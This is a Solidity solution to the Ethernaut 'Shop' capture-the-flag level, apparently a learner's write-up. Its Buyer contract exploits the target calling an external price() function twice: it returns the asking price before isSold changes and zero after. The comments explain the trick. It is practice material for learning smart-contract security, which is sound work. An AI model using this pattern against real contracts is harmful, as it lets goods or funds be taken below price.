// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0x573da1979830F890eDa4dC1C2D8F40a55E178243

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

// solution

// to buy the item for a lower price than the asked, we can use the fact that
// there are two consecutive calls to the price() method of the buyer contract,
// to return different values in each call, depending on the isSold value, which
// is modified between the two calls

// so first we need to return a price equal or higher than the asked is the item is not sold yet to pass the if statement, 
// then in the second call (when isSold == true) we can simply return a lower price

// set the shop address, call buyItem and submit

contract Buyer {
    Shop public shop;

    function setShop(address _shop) external {
        shop = Shop(_shop);
    }

    function buyItem() external {
        shop.buy();
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) return shop.price();
        return 0;
    }
}